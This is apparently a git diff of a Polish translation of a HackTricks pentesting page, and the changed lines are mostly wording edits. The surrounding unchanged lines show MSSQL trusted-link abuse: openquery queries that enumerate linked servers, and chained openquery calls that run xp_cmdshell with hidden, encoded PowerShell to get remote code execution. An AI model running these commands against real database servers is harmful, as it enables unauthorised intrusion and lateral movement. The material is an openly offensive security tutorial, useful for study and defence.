@@ -10,7 +10,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
@@ -220,7 +220,7 @@ EXEC sp_linkedservers;
 
 #### Wykonaj zapytania w zaufanym linku
 
-Wykonaj zapytania przez link (przykład: znajdź więcej linków w nowej dostępnej instancji):
+Wykonaj zapytania przez link (przykład: znajdź więcej linków w nowo dostępnym instancji):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -230,7 +230,7 @@ Sprawdź, gdzie używane są podwójne i pojedyncze cudzysłowy, ważne jest, ab
 
 ![](<../../.gitbook/assets/image (643).png>)
 
-Możesz kontynuować tę ręcznie zaufaną sieć linków w nieskończoność.
+Możesz ręcznie kontynuować ten łańcuch zaufanych linków w nieskończoność.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -238,9 +238,9 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Jeśli nie możesz wykonać akcji takich jak `exec xp_cmdshell` z `openquery()`, spróbuj metody `EXECUTE`.
+If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
 
-### Ręcznie - EXECUTE
+### Manual - EXECUTE
 
 Możesz również nadużyć zaufanych linków używając `EXECUTE`:
 ```bash
